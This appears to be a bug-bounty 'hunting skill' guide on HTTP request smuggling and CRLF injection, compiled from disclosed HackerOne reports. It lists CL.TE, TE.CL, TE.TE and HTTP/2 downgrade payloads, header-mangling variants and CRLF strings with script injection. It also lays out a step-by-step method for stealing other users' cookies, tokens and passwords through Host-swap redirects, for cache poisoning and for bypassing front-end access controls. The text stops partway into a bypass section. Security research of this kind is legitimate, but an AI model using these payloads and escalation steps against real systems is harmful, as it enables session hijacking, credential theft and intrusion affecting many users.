---
name: hunt-request-smuggling
description: "Hunting skill for HTTP request smuggling / desync / CRLF injection. Built from 176 assigned
  reports: 155 FULL disclosed-report texts mined, 40 highest-signal reports with payloads, ~90 verbatim
  discovery clues, and 60 payload exemplars. Covers CL.TE, TE.CL, TE.TE, CL.CL, H2.CL, H2.TE downgrade,
  CR-to-hyphen conversion, space-before-colon, LF-only header delimiting, multi-line Transfer-Encoding,
  chunk-extension parsing, header-field delimiting bugs, and CRLF injection into request-line / redirect /
  URL / SMTP / PROXY-protocol fields. Crown jewels: mass cookie theft (Slack d-cookie #737140, Zomato
  X-Access-Token #771666), password theft (New Relic #498052 $3000), HTTP/2 smuggling (Basecamp #1211724
  $7500), cache poisoning (Basecamp 2 #919175), backend-socket HMAC leak (#753939), and mod_proxy_ajp→AJP
  desync (#1594627 $2400). Confirm with time-delay / differential-response before claiming; effect MUST
  land on a different client's request. Use when hunting any CDN→origin, load balancer→backend,
  reverse-proxy, or HTTP-client-library target."
sources: hackerone_public, portswigger_research, cve_database, public_research, curl_source
report_count: 176
full_reports_read: 155
---

## Crown Jewel Targets

Request smuggling is highest-value where **two HTTP parsers disagree** — a front-end (CDN, load
balancer, reverse proxy, WAF) and a back-end (origin, app server, AJP connector) that were not configured
to interpret message boundaries identically. The bug is not in application logic; it lives in the
*infrastructure seam*. Across the 155 full reports, the recurring high-severity targets are below.

- **CDN → origin chains (HTTP/2 downgrade).**
  - *Why:* the edge speaks HTTP/2 to the client but HTTP/1.1 to origin; H2 frame-length headers do not
    survive the downgrade cleanly, so `content-length` / `transfer-encoding` are reinterpreted.
  - *What to look for:* H2 support plus a distinct origin; Cloudflare Transform Rules (`concat()` hex
    escapes, #1478633 $6,000), Origin Rules (newline in `host_header`, #1575912 $3,100), Basecamp
    via HTTP/2 (#1211724 $7,500).
  - This is the dominant modern vector in 2024–2026.

- **Mass credential-theft endpoints with keep-alive multiplexing.**
  - *Why:* the next request on a poisoned socket carries a real victim's `Cookie`, `Authorization`, or
    custom token.
  - *What to look for:* high-traffic hosts behind a CDN. Slack `slackb.com` d-cookie theft (#737140),
    Zomato `api.zomato.com` X-Access-Token bulk theft (#771666, CVSS 9.8), New Relic login password
    theft (#498052 $3,000), LINE `admin-official.line.me` ATO (#740037).

- **Caching reverse proxies.**
  - *Why:* a smuggled request whose response is cached under a popular URL becomes stored XSS / mass
    redirect for every subsequent visitor.
  - *What to look for:* `X-Cache: HIT/MISS`, `X-Original-link`, reflected `Location`. Basecamp 2
    web-cache poisoning (#919175), Starbucks cache poisoning (`newscdn.starbucks.com` #192749),
    caching-redirect conversion (#510152).

- **Proxy-to-application-protocol bridges.**
  - *Why:* the smuggled request is opaque to the front-end WAF and reaches internal admin/status paths
    lacking external auth controls.
  - *What to look for:* Apache `mod_proxy_ajp` → Tomcat AJP desync (#1594627 $2,400, info disclosure /
    RCE), HAProxy PROXY-protocol injection via `CURLOPT_HAPROXY_CLIENT_IP` (#3633534).

- **Node.js / `llhttp` and other custom HTTP parsers.**
  - *Why:* a dense family of parser-disagreement CVEs from a single codebase.
  - *What to look for:* CR-to-hyphen (#922597), space-before-colon (#1238709), LF-only delimiting
    (#1524692), multi-line TE (#1501679 / #1630667), flawed TE parsing (#1524555 / #1630668), ignored
    chunk extensions (#1238099), improper header delimiting (#1675191 / #1630669).

- **HTTP client libraries with raw header / URL sinks.**
  - *Why:* option strings are concatenated into request lines and headers with no CRLF neutralization.
  - *What to look for:* libcurl custom-header CRLF (#3484431), RTSP option injection (#3963494 /
    #4121675), request-line injection via `--request-target` (#4121689), SMTP command smuggling
    (`--mail-from` / `--mail-rcpt` #3235428 / #3481595), Ruby `net/http` `set_content_type` (#1168205),
    Node `undici` host header (#1820955), legacy `url.parse().hostname` (#771596).

- **Open-redirect / Host-header-dependent hosts.**
  - *Why:* smuggle an absolute-form or Host-swapped request so the back-end emits a 301/302 to an
    attacker domain and attaches victim cookies.
  - *What to look for:* Acronis `consumer.acronis.com` / `promosandbox.acronis.com` (#1063627 /
    #1063493), Twitter/Periscope subdomains (#713285 / #715996), DoD stage hosts (#526880).

- **SSO/OAuth `redirect_uri` and JSON API endpoints.**
  - *Why:* CRLF into a reflected header on an authorize endpoint, or a JSON body behind a CL/TE-split
    front-end.
  - *What to look for:* Bugzilla OAuth `redirect_uri` CRLF (#2147132), Helium `POST /api/sessions`
    (#867952), Lob `POST /auth/session` (#694604).

Payouts cluster at **$3K–$7.5K** for confirmed desync with victim impact; parser CVEs through Internet
Bug Bounty pay ~$1,800 each (#1630667 / #1630668 / #1630669 / #2327341 / #2299692). Mass-ATO cases are
rated Critical (CVSS 8.5–9.8) even where the public bounty is $0 because of disclosure timing. This class
has one of the lowest duplicate rates of the major web bug categories when recon is tool-driven
(`smuggler`, HTTP Request Smuggler, 150-payload custom matrices).

---

## Attack Surface Signals

### Topology / response signatures to fingerprint first

```
Server: nginx / Caddy / envoy          -> RFC-strict, classic CL.TE usually dead
Server: (none) / CDN vendor            -> probe H2.CL, H2.TE, single space-before-colon probe
Via: 1.1 <proxy>, X-Cache, X-Original  -> caching front-end => cache-poisoning payoff
X-Original-link / Location reflected   -> CRLF / response-splitting surface
421 Misdirected Request                 -> Host-header parsing divergence
Transfer-Encoding accepted on POST     -> back-end parses chunked
```

A single response header can redirect the whole engagement: a caching front-end changes the impact from
"parser disagreement" to "stored XSS at scale," and a missing `Server` header means you must assume a
hardened edge but still run one cheap ambiguity probe.

### Request-shape signals

- Two framing headers on one request: `Content-Length` **and** `Transfer-Encoding` present — the
  classic ambiguity surface that most modern edges reject with 400 but many origins still accept.
- Repeated `Transfer-Encoding` headers (one valid, one invalid) — TE.TE front/back disagreement
  (#867577, #1002188). A front-end that inspects only the second header falls back to CL.
- Whitespace anomalies in the field name — `Transfer-Encoding␠: chunked` (space before colon),
  `Transfer-Encoding\t:\tchunked` (tab). Both appeared in the corpus (#1238709, #1063627/#1063493).
- Bare `CR` or bare `LF` used as the header delimiter instead of `CRLF` — CR→hyphen (#922597),
  LF-only delimiting (#1524692), bare-CR request lines (#526880).
- `obs-fold` / multi-line `Transfer-Encoding: chunked , identity` — one parser folds to a two-value
  list, the other keeps the first token (#1501679, #1665156).
- Chunk extensions carrying bytes outside ABNF (`; a=b`, `;|`) that a parser silently skips (#1238099).
- Absolute-form request line `GET http://host/ HTTP/1.1` or Host swapped to a Collaborator domain —
  the redirect/cookie-exfiltration primitive (#737140, #1063627).

### Feature-based surfaces seen in the corpus

```
POST /api/sessions  POST /identity      POST /publishers/registrations.json
POST /auth/session  POST /4618984/account   /sf (redirect path)
redirect_uri=       url=                Host: (client-controlled)
CURLOPT_* options   --mail-from / --mail-rcpt   SMTP recipient operand
PROXY protocol v1 client IP             Digest Authorization uri parameter
```

### Stack signals

- **HAProxy ≤ 2.4**, older **F5 BIG-IP (TMM < 16)**, older **Citrix ADC / NetScaler**, **Squid 3.x**,
  older **Apache Traffic Server**, and **custom Python/Go proxies** — historically vulnerable to the
  classic CL.TE / TE.CL classes.
- **Node.js `llhttp`** — a dense CVE family (see Crown Jewels). Fingerprint the version via error
  strings or the `Server` header; many reports are reproducible against a known vulnerable Node build.
- **Apache `mod_proxy_ajp` → Tomcat** — cross-protocol desync (#1594627, CVE-2022-26377 class).
- **CDN front-ends (Cloudflare, Akamai)** with Transform/Origin Rules that concatenate header values —
  hex escapes and newlines in `concat()` / `host_header` become request-line injection (#1478633,
  #1575912).
- **libcurl / curl** anywhere in the stack as an HTTP client — raw option strings with no CRLF
  neutralization. Several 2026 reports (#3484431, #3963494, #4121689, #3235428) came from manual
  source review of this library.

---

## Discovery Patterns From 155 Full Reports

### Where Researchers Start (ranked recon surfaces, with what to look for)

1. **Tool-driven bulk host sweep (`smuggler`, HTTP Request Smuggler, 150-type custom matrices).**
   This is the single most common starting point in the corpus.
   - `[#737140] I was running \`smuggler -u https://slackb.`
   - `[#771666] I have custom tools to evaluate over 150 types of HTTP Smuggling Payloads.`
   - *What to look for:* any differential response — 400 vs timeout, 504 with delay, or
     "Unrecognized Transfer-Encoding" — across CL.TE / TE.CL / TE.TE / H2.CL / mangled variants. These
     differentials are the ticket to investigate a host further.

2. **Top-list / subdomain inventory of high-traffic hosts.**
   Slack `slackb.com`, LINE admin, Zomato API, New Relic login, Twitter/Periscope subdomains.
   - *What to look for:* hosts that terminate TLS at a CDN then proxy to a distinct origin. Different
     `Server` banners between subdomains reveal the seam — #713285 notes "many subdomains in pscp.tv
     and periscope.tv vulnerable."

3. **Source-code review of the HTTP parser / client library.**
   - `[#648434] In 2015, Starting from these past studies, I studied **Apache**, **Nginx**, **Varnish**
     source code, I discovered`
   - `[#3723248] I found a parsing difference in Node's HTTP/1 handling for the Connection header.`
   - *What to look for:* code paths that match `chunked` loosely (`/chunked/i` on the whole value),
     skip CRLF validation, ignore chunk extensions, or prioritize TE without rejecting CL.

4. **Public-code-search on open-source components.**
   - `[#771596] During the recent penetration test, I have found a whitelist bypass using CRLF
     Injection.`
   - *What to look for:* `set_content_type`, `url.parse()`, `curl_maprintf` with a raw `uri`, `client_write`
     of DN/attributes — any string concatenated into a header/request line without control-char filtering.

5. **Login / session POST endpoints.**
   Helium `POST /api/sessions`, Lob `POST /auth/session`, Brave `/publishers/registrations.json`,
   Grafana config PUT.
   - *What to look for:* JSON or form body with an adjustable `Content-Length`; append a smuggled `GET /`
     behind the body (#867952, #694604, #1200647).

6. **Redirect-probe and cache probing.**
   - `[#919175] During redirect probe, It also appears that front-end infrastructure performs caching
     of content.`
   - *What to look for:* `X-Cache: HIT/MISS`, `Location` headers built from user input, and the `/sf`
     path that reflects a Host swap (#1063627).

7. **CRLF test on every reflected URL parameter.**
   - `[#95981] So i found a http response splitting issue in your website.`
   - *What to look for:* `%0d%0a`, `%0d`, `%23%0d` in the path / `redirect_uri` / URL producing an
     injected `Set-Cookie` or `Location` (Twitter #191380, Starbucks #192667/#192749, ownCloud #154306,
     Ubiquiti #145128, GSA #1038594).

8. **SMTP / protocol-handler option fuzzing in libraries.**
   - `[#3911605] CRLF characters embedded in the SMTP recipient operand used with a custom SMTP request
     are transmitted as additional SMTP commands.`
   - *What to look for:* `--mail-from`, `--mail-rcpt`, `CURLOPT_MAIL_FROM`, `CURLOPT_RTSP_*`,
     `CURLOPT_REQUEST_TARGET`, `CURLOPT_HAPROXY_CLIENT_IP`.

9. **Host-header injection on password-reset / OAuth flows.**
   - `[#1098948] While performing security testing on your Main Domain, I found a Host Header Injection
     Vulnerability.`
   - *What to look for:* Host reflected into reset links or `redirect_uri`; double-submit-cookie CSRF
     bypass via an injected `Set-Cookie` (#145128, #2147132).

10. **Timing-based delay confirmation on any suspect host.**
    - `[#713285] Detect HTTP request smuggling attack (504 response with delay (30 s, 60s))`
    - *What to look for:* a smuggled prefix that makes the back-end wait, producing a 30–60 s stall on
      the *next* request on that connection.

11. **Regression / patch-diff review.**
    - `[#1665156] Due to an incomplete fix for CVE-2022-32215 ... still does not correctly handle
      multi-line Transfer-Encoding headers.`
    - *What to look for:* "fixed" parsers that only patched one of several equivalent parser bugs.

12. **Versioned-route / default-behavior surprises.**
    - `[#1025575] Personally I was a bit surprised that versioned routes was a default behavior.`
    - *What to look for:* alternate routing paths that reach a different parser instance.

### Feature-Based Discovery Signals (frequency-ranked across 155 full reports)

The counts are the number of full reports in the corpus containing each signal. Use the ranking to
prioritize: the top rows are both the most common bug contexts and the richest sources of impact.

| Signal (full reports) | Why it matters / what to probe |
|---|---|
| request-smuggling (127) | Core bug class. Probe CL.TE, TE.CL, TE.TE, CL.CL, H2.CL, H2.TE on every framing-capable endpoint. |
| filter-bypass (56) | Front-end ACL denied paths are the payoff. Smuggle `GET /admin`, `/flag`, `/login` past the filter (#1002188, #1238099). |
| internal-network (55) | Smuggled request reaches internal-only routes. Probe `/admin`, `/server-status`, internal paths. |
| redirect-handling (49) | Smuggle an absolute-form or Host-swapped request → 301/302 to attacker capturing cookies (#737140, #1063627). |
| cookie-handling (49) | Primary impact primitive. Probe whether the next victim request's `Cookie`/`d`/`X-Access-Token` lands on your path. |
| search-filter-sort (44) | Reflecting query endpoints become "collector gadgets" — the smuggled response echoes the next user's headers. |
| proxy-feature (43) | Reverse-proxy / CDN layer is the disagreement engine. Fingerprint front-end, then choose payload class. |
| cache-layer (43) | Smuggle→cache = stored at scale. Probe `X-Cache`, cache keys, popular URLs (#919175, #192749, #510152). |
| session-attack (39) | Session fixation / theft via injected `Set-Cookie` or captured auth tokens. |
| comment-injection (38) | Comment tokens obscure header boundaries (`Something: GET /smuggled`). |
| server-side-rendering (30) | SSR/PDF/screenshot pipelines that fetch user-controlled templates often combine CRLF + smuggling. |
| api-endpoint (29) | JSON POST APIs with adjustable body length are ideal CL.TE carriers. |
| image-processing (28) | Image/CDN hosts often fronted by caching proxies; reflected `X-Original-link`. |
| public-code-search (20) | Find parser/client bugs by grepping open source before touching a live target. |
| import-feature (18) | Import/URL-fetch features pass raw strings to HTTP clients → CRLF into headers. |
| js-source-review (18) | Review Node `llhttp`, `undici`, `url.parse()` call sites for missing CRLF neutralization. |
| command-injection (18) | CRLF into SMTP/RTSP/FTP handlers escalates to command smuggling (#3235428, #3627638). |
| admin-internal (14) | Admin/status endpoints are the highest-value smuggle destination. |
| open-redirect (13) | Coupled with cookie capture: victim redirected to attacker with their own auth in the URL. |
| blind-oob (12) | Collaborator/Canary proves the poisoned request reached an attacker-controlled host. |
| sso-oauth (12) | `redirect_uri` / `Authorization` header injection (#2147132, #3508799). |
| xml-parser (12) | XML/SOAP endpoints behind proxies; malformed framing reaches a different parser. |
| host-header (10) | Host divergence drives redirects and cache keys (#643225, #919175). |
| dos-resource (10) | Time-delay desync can be a DoS (30–60 s stalls). |
| json-body (9) | JSON bodies with CL counted by the front-end, TE by the back-end. |
| base64-encoding (3) | Encoded payloads survive front-end filter inspection (#1063627). |
| stack-fingerprinting (3) | Server-banner probing to select the right payload class. |
| unicode-normalization (2) | Charset/Unicode edge cases in header parsing. |
| null-byte (2) | NUL truncates filter checks before header injection. |
| case-variation (2) | Case-mangled header names to evade case-sensitive filters. |
| parameter-pollution (1) | Duplicate parameters causing parser disagreement. |

### Verbatim Discovery Clues (18 real quotes from the corpus)

Each quote is a researcher's own account of how the bug was found, verbatim from disclosed text.

- `[#737140] My name is Evan and I'm a first time bug hunter to your platform :) Because you guys were running a month long bounty promotion I decided to take a little of my time and gently perform recon on your platform.`
- `[#737140] I was running \`smuggler -u https://slackb.`
- `[#771666] My name is Evan Custodio and this is my first time evaluating your platform. I specialize in looking for server-side vulnerabilities. Recently I've taken a deep look at HTTP Request Smuggling issues. I have custom tools to evaluate over 150 types of HTTP Smuggling Payloads.`
- `[#726773] The application appears to be vulnerable to HTTP request smuggling due to a disagreement between the front-end and back-end server, where the front-end server uses the Transfer-Encoding header to determine content in the HTTP body, but back-e`
- `[#867952] console.helium.com s vulnerable to CL TE ( Front end server uses Content-Length , Back-end Server uses Transfer-encoding ) HTTP request smuggling attack.`
- `[#919175] During redirect probe, It also appears that front-end infrastructure performs caching of content. Using HTTP request smuggling attack, It is possib`
- `[#526880] The sites at █████████ and ww.██████████ are vulnerable to backend socket poisoning which enables attackers to hijack responses to other users.`
- `[#715996] to detect HTTP request smuggling attack with add header \`Transfer-Encoding: chunked\` and encode the body of request with chunked encode.`
- `[#1063627] In this PoC I was able to massive redirect users to a domain under my control but other scenarios are also possible like the ones described here https://portswigger.`
- `[#771596] During the recent penetration test, I have found a whitelist bypass using CRLF Injection.`
- `[#590020] I found CRLF Injection a few months ago.`
- `[#753939] we will notice i was able to cause the next valid request to error out returning valuable details.`
- `[#1098948] While performing security testing on your Main Domain, I found a Host Header Injection Vulnerability.`
- `[#95981] So i found a http response splitting issue in your website.`
- `[#1025575] Personally I was a bit surprised that versioned routes was a default behavior.`
- `[#3911605] I observed that CRLF characters embedded in the SMTP recipient operand used with a custom SMTP request are transmitted as additional SMTP commands.`
- `[#648434] In 2015, Starting from these past studies, I studied **Apache**, **Nginx**, **Varnish** source code, I discovered`
- `[#3723248] **Description:** I found a parsing difference in Node's HTTP/1 handling for the \`Connection\` header.`

### Probe Checklist (15 concrete probes)

Run these against every in-scope host that shows a claimable seam; each maps to a real report pattern.
Record the exact response for each probe — even negative results tell you which parser is strict.

1. **CL.TE baseline** — send `Content-Length: 13` + `Transfer-Encoding: chunked`, body
   `0\r\n\r\nSMUGGLED\r\n`. A differential 400/timeout indicates front uses CL, back uses TE.
2. **TE.CL baseline** — `Transfer-Encoding: chunked` with a `Content-Length` shorter than the chunked
   body; front uses TE, back uses CL. GSA #726773 and Fortmatic #753939 used this shape.
3. **TE.TE duplicate-header** — one valid `Transfer-Encoding: chunked` plus a second invalid one
   (e.g. `Transfer-Encoding: x`) so front ignores TE and uses CL, back honors the first TE (#867577,
   #1002188).
4. **CL.CL duplicate** — two conflicting `Content-Length` headers; some parsers take the first, others
   the last.
5. **Time-delay confirmation** — append a smuggled `GET / HTTP/1.1` with a large CL so the back-end
   waits; if the next request on the connection stalls 30 s (or returns 504), desync is confirmed
   (#713285, #867952).
6. **Space-before-colon** — `Transfer-Encoding␠: chunked` / `Content␠Length: 42` → Node `llhttp`
   divergence, front ignores header (#1238709, #922597).
7. **Tab-separator** — `Transfer-Encoding\t:\tchunked` (Acronis used a literal tab in both
   #1063627 and #1063493).
8. **Bare-CR / bare-LF delimiting** — replace a header's `\r\n` with `\n` or `\r`; Node accepts LF-only,
   the proxy does not (#1524692, #526880).
9. **CR-to-hyphen** — `Content[CR]Length: 42`: Node converts CR→`-` to form `Content-Length`, while the
   proxy ignores the malformed header (#922597).
10. **Multi-line TE / obs-fold** — `Transfer-Encoding: chunked\r\n , identity` → one parser folds to
    `chunked , identity`, the other to the final `identity` (#1501679, #1665156).
11. **Chunk-extension abuse** — `1;|...` or `; a=b` with bytes outside ABNF; some parsers skip to `\r`
    and mis-frame the body (#1238099).
12. **Malformed TE token** — `Transfer-Encoding: AAAchunkedBBB` matches `/chunked/i` in weak parsers
    (WEBrick #965267); `chunkedchunked` is re-matched in `llhttp` (#1524555).
13. **H2.CL / H2.TE downgrade** — with a raw-HTTP/2 client, send `content-length` or `transfer-encoding`
    on an H2 request that the edge downgrades to HTTP/1.1 at origin (#1211724, Cloudflare #1478633).
14. **Host swap / absolute-form redirect** — set `Host: <collaborator>` and smuggle `GET /sf` or an
    absolute-form request line; watch for a 301/302 that leaks victim cookies to your listener
    (#737140, #1063627).
15. **CRLF into reflected parameter** — inject `%0d%0aSet-Cookie:...`, `%0d%0aLocation:...`,
    `%23%0d...` into path / `redirect_uri` / URL params and inspect raw response headers (#191380,
    #2147132, #145128).

---

## Step-by-Step Hunting Methodology

1. **Fingerprint the seam.**
   Run `curl -sI https://target/ | grep -i 'Server:'` and inspect `Via`, `X-Cache`, and HTTP/2 support.
   Then apply the target-suitability matrix below. If `Server: nginx 1.21+`, Caddy, or Envoy → classic
   CL.TE is likely dead; go H2.CL/H2.TE or look for a legacy upstream. If there is no `Server` header,
   assume a hardened edge but still run one cheap ambiguity probe.

   | Front-end | CL.TE | TE.CL | H2.CL | H2.TE | Notes |
   |---|---|---|---|---|---|
   | Nginx ≥ 1.21 | NO | NO | partial | partial | RFC-strict; rejects CL+TE with 400 |
   | Caddy 2.x | NO | NO | — | — | Hardened by default |
   | Envoy ≥ 1.20 | NO | NO | partial | partial | Hardened in most paths |
   | HAProxy ≤ 2.4 | ✓ | ✓ | — | — | Vulnerable (CVE-2021-40346) |
   | AWS ALB + specific upstream | partial | partial | ✓ | ✓ | Several paid 2022–2024 reports |
   | Cloudflare → S3/Lambda | — | — | ✓ | ✓ | H2-downgrade viable (#1478633, #1575912) |
   | Older F5 BIG-IP (TMM < 16) | ✓ | — | — | — | Vendor advisories |
   | Citrix ADC / NetScaler (old) | ✓ | ✓ | — | — | Disclosed 2020–2022 |
   | Squid 3.x | ✓ | — | — | — | Older deployments |
   | Apache Traffic Server (old) | ✓ | ✓ | ✓ | ✓ | PortSwigger research; #1238099 |
   | mod_proxy_ajp → Tomcat | — | — | — | — | Cross-protocol AJP desync (#1594627) |
   | Custom Python/Go proxies | ✓ | ✓ | — | — | Often miss RFC enforcement |

2. **Pick the payload class from the fingerprint.**
   Nginx/Caddy/Envoy → H2 downgrade or parser-specific mangle (space-before-colon, LF-only).
   HAProxy/Squid/F5/custom → full CL.TE/TE.CL/TE.TE matrix. Node.js back-end → the `llhttp` CVE family.

3. **Automate the first pass.**
   Load Burp **HTTP Request Smuggler** (right-click → Extensions → HTTP Request Smuggler → Smuggle
   probe) or run `smuggler -u https://target` / a 150-type custom matrix like the researchers in
   #737140 and #771666. Against H2-fronted targets use a raw-HTTP/2 client (`h2csmuggler`, Burp Pro
   extension, `smuggler.py`) — curl and raw sockets send the wrong protocol entirely.

4. **Confirm parser disagreement with a time delay before anything else.**
   Send a desync prefix whose smuggled `GET` carries a large Content-Length so the back-end waits for
   more bytes; then request a benign path on the same connection. A 30–60 s stall or 504 proves the
   back-end is waiting on a body the front-end already consumed (#713285, #867952, #1120982). This is
   necessary but not sufficient for exploitable smuggling.

5. **Escalate to a differential-response proof.**
   Use Turbo Intruder (as in #726773, #867577) to send one desync then N victim-like requests in quick
   succession (`requestsPerConnection=1`). Look for one victim request receiving the smuggled response:
   a 302 to `hazimaslam.com` in #867577, an HMAC leak in #753939, leaked backend headers in #753939.

6. **Choose the impact primitive based on app behavior.**
   - *Cookie/token theft:* smuggle a request that forces the back-end to emit an absolute-form redirect
     to your Collaborator, carrying the next user's cookies (#737140, #771666, #1063627).
   - *Collector gadget:* aim the smuggled request at a reflecting handler (search endpoint, header-echoing
     redirect) so the next victim's `Cookie` / `Authorization` is returned in a response you can read.
   - *Cache poisoning:* smuggle a request whose response contains your HTML/JS and have the front-end
     cache store it under a popular URL (#919175, #192749, #510152).
   - *Auth bypass / internal access:* smuggle `GET /admin`, `/flag`, `/server-status` past the front-end
     ACL (#1002188, #1238099).
   - *Credential capture on login:* wrap the desync around a POST body so the next victim's credentials
     land on your smuggled path (#498052).

7. **Set up out-of-band confirmation for blind cases.**
   Use Burp Collaborator, interactsh, or Canarytoken. Change the smuggled request's Host or redirect
   target to your unique subdomain (#1063627 used
   `9oyta0p1z1ratbswtnnl67cv1m7cv1.burpcollaborator.net`; #726773 also swapped the Host). Confirm the
   hit before claiming cookie theft.

8. **Guess the next request correctly.**
   The smuggled prefix must align with the next real request's method, path, and headers. Use exact byte
   counts: Acronis notes "The size of 64 bytes in hex on the request body must match with the size the
   second POST request" (#1063627). Twitter/Periscope note "add the two CRLFs in the end of the second
   request in GET REQUEST; use the valid value of content-length in POST REQUEST" (#713285). An off-by-one
   leaves the parser misaligned.

9. **Verify on a different client/session.**
   Trigger the smuggled effect from one session and observe it in a separate browser/session or via
   Collaborator. The smuggled response must land on a request you did not craft. A timing stall in your
   own browser is only parser disagreement, not exploitable smuggling.

10. **Document deterministically.**
    Save the exact raw bytes (hex view for CR/LF/tab), the front/back `Server` banners, the Turbo Intruder
    script, the OOB/Collaborator interaction, and a clean before/after response pair. For parser CVEs
    include the minimal reproducer (e.g. `printf "POST / HTTP/1.1..."`, #1665156) and the affected
    version.

---

## Payload & Detection Patterns

### CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The front-end forwards 13 bytes (`0\r\n\r\nSMUGGLED`), believing the body ends; the back-end reads the
`0` chunk terminator and treats `SMUGGLED` as the start of the next request. This is the canonical
PortSwigger form; Helium #867952 and Brave #866382 used this class against
`POST /api/sessions` / `POST /publishers/registrations.json`.

### TE.CL (front uses Transfer-Encoding, back uses Content-Length)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: target.com
Content-Length: 15

x=1
0

```

The front-end forwards the whole chunked body; the back-end reads only 4 bytes (`5c\r\n`) and leaves the
rest as the next request. GSA #726773 and Fortmatic #753939 used TE.CL-style front=TE / back=CL
desync. Fortmatic's `[space]Transfer-Encoding: chunked` plus a `0` chunk made the back-end leak the
HMAC key, its encryption type, and additional reflected headers.

### TE.TE (both support TE, one is tricked into ignoring it)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GPOST / HTTP/1.1
...
0

```

The front-end examines the second (invalid) TE and falls back to CL; the back-end honors the first TE.
From #867577: "a valid Transfer-Encoding header followed by an invalid Transfer-Encoding header. The
frontend server only examines the second ... so it uses the Content-Length instead." See also #1002188
(HAProxy `/flag` bypass) and #735748 (malformed TE).

### H2.CL / H2.TE downgrade (modern dominant vector)

```
:method POST
:scheme https
:path   /
:authority target.com
content-length: 4        <-- ignored by HTTP/2 front, honored after downgrade to HTTP/1.1 back-end
transfer-encoding: chunked
```

HTTP/2 frames carry length at the frame layer, so a `content-length` / `transfer-encoding` header on an
H2 request is often passed through verbatim to an HTTP/1.1 origin and reinterpreted there. Use Burp Pro's
HTTP Request Smuggler, `h2csmuggler`, or `smuggler.py`. #1211724 (Basecamp, $7,500) and the Cloudflare
Rules cases (#1478633 hex escapes in `concat()`, #1575912 newlines in `host_header`) are corpus-confirmed.

### Parser-mangling payloads (Node.js `llhttp` family, all real reports)

```
Content[CR]Length: 42          # CR→hyphen: Node builds "Content-Length", proxy ignores  (#922597)
Transfer-Encoding␠: chunked     # space before colon: Node reads TE, proxy ignores       (#1238709)
Transfer-Encoding\t:\tchunked   # tab before colon                                       (#1063627)
Dummy: x[\n]Content-Length: 23 # LF-only header delimiting                               (#1524692)
Transfer-Encoding: chunked\r\n , identity   # obs-fold multi-line TE                     (#1501679)
Transfer-Encoding: AAAchunkedBBB            # /chunked/i loose match                     (#965267)
Transfer-Encoding: chunkedchunked           # flawed re-match after chunked              (#1524555)
1;|...                                     # chunk extension bytes ignored to \r          (#1238099)
```

### CRLF injection into headers / request-line / protocol fields

```
# Response splitting / Set-Cookie via reflected path
/%0d%0aSet-Cookie:crlf=injection;domain=.target.com;      (#1038594, #154306, #145128)
/%3f%0d%0aLocation://x:1%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>...</script>   (#192667)
/%0d%0aContent-Length:35%0d%0a...<svg onload=...>          (#192749 cache-poisoned)

# OAuth redirect_uri header injection
/authorize?client_id=&redirect_uri=%0d%0axxx:something&response_type=code   (#2147132)

# HTTP client option injection (libcurl family)
curl -H "X-Injected: Value\r\nInjected-Header: Malicious" http://host/       (#3484431)
--mail-from "a@b\r\nRCPT TO:<victim>"                                       (#3235428, #3481595)
CURLOPT_REQUEST_TARGET / CURLOPT_RTSP_STREAM_URI with raw CRLF              (#4121689, #4121675)
CURLOPT_HAPROXY_CLIENT_IP -> "PROXY TCP4 ...\r\n" injection                  (#3633534)
set_content_type("text/html", {"charset"=>"iso-8859-1\nHeader:Inject"})      (#1168205)
url.parse("http://test1.com\n\rtest2.com").hostname                         (#771596)
```

### Cross-protocol desync

```
# Apache mod_proxy_ajp -> Tomcat AJP: smuggle a request opaque to the front-end,
# reaching internal AJP admin/status paths lacking external auth (#1594627, CVE-2022-26377 class)
```

### Detection-tool quick reference

```
Burp HTTP Request Smuggler   - Smuggle probe / H2.CL / TE.TE auto-detection
smuggler -u https://target   - bulk host sweep (#737140)
Turbo Intruder               - one desync + N victim requests (#726773, #867577, #1063627)
h2csmuggler / smuggler.py    - raw HTTP/2 frame smuggling
nc -l -p 8080 > raw.txt      - capture smuggled bytes; hexdump -C to see 0d 0a (#3484431)
Collaborator / interactsh    - blind proof of Host-swap / redirect exfil
```

---

## Common Root Causes

1. **Conflicting framing headers accepted by both parsers.**
   A request carrying both `Content-Length` and `Transfer-Encoding` is not rejected with 400; one parser
   picks CL, the other TE. This is the root of CL.TE, TE.CL, and the entire `llhttp` CVE family
   (#867952, #3249936, #1630668).

2. **Front-end and back-end are different HTTP implementations with different RFC strictness.**
   Nginx-front + Node-origin, CDN + custom origin, Apache + Tomcat AJP (#1594627) — each side resolves
   ambiguity differently, so the same byte stream means two different things.

3. **Loose token matching in parsers.**
   `Transfer-Encoding: AAAchunkedBBB` matching `/chunked/i` (#965267), `chunkedchunked` re-matched after
   CRLF failure (#1524555), multi-line TE folded incorrectly (#1501679 / #1665156).

4. **Non-RFC header delimiters.**
   Bare CR, bare LF, or CR-to-hyphen conversion at one hop (#922597, #1524692, #526880); space/tab before
   the colon (#1238709, #1063627).

5. **Chunk-extension bytes skipped rather than validated.**
   The parser consumes everything up to `\r` instead of validating against ABNF (#1238099).

6. **Incomplete fixes.**
   CVE-2022-32215's multi-line TE issue was "seemingly not fixed at all" — the same exploit reproduced
   (#1665156). cURL's CL/TE non-rejection was rediscovered via manual source review (#3249936).

7. **CRLF not neutralized in strings concatenated into request lines / headers.**
   libcurl option strings (`Curl_setstropt` checks only length) (#4121689 / #4121675 / #3484431 /
   #3963494), Ruby `net/http` `set_content_type` (#1168205), Node `undici` host (#1820955), legacy
   `url.parse()` (#771596), and Digest `uri` (#3508799).

8. **Host / redirect trust.**
   The back-end builds absolute redirects from a client-controllable Host, attaching victim cookies when
   the path is smuggled (#737140, #1063627, #1063493).

9. **Caching of poisoned responses.**
   The front-end caches a smuggled response under a shared key, turning one desync into stored impact for
   all visitors (#919175, #192749, #510152).

10. **Keep-alive / pipelining reuse.**
    Multiple requests per connection are required for the smuggled prefix to attach to a *different*
    request. `#713285` used `requestsPerConnection=1`; endpoints that force `Connection: close` after
    each response are far less exploitable.

---

## Bypass Techniques

### Framing / header obfuscations to evade front-end normalization

```
# Duplicate & conflicting headers
Content-Length: 4 / Content-Length: 8       (CL.CL)
